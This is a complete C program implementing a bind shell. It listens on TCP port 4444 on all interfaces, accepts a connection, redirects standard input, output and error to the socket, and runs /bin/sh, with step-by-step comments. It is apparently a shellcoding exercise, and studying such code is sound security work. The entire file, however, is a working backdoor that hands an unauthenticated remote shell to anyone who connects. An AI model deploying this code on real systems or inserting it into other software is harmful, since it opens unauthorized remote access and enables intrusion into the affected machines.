#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main (){

	// Creating File Descriptor for the Socket	
	int socket_fd;
	socket_fd = socket(AF_INET, SOCK_STREAM, 0);

	// Binding the socket to server address
	struct sockaddr_in server_address; 
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(4444);
	server_address.sin_addr.s_addr = INADDR_ANY;

	bind(socket_fd, (struct sockaddr *)&server_address, sizeof(server_address)); 

	// Activate listening on the socked
	listen(socket_fd, 0); 

	// Accept new connections on the socket
	int connection_fd;
	connection_fd = accept(socket_fd, NULL, NULL);

	// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Connection_FD
	dup2(connection_fd, 0); 
	dup2(connection_fd, 1);
	dup2(connection_fd, 2);

	// Invoking EXECVE
	execve("/bin/sh", NULL, NULL);

	// Return
	return 0;
}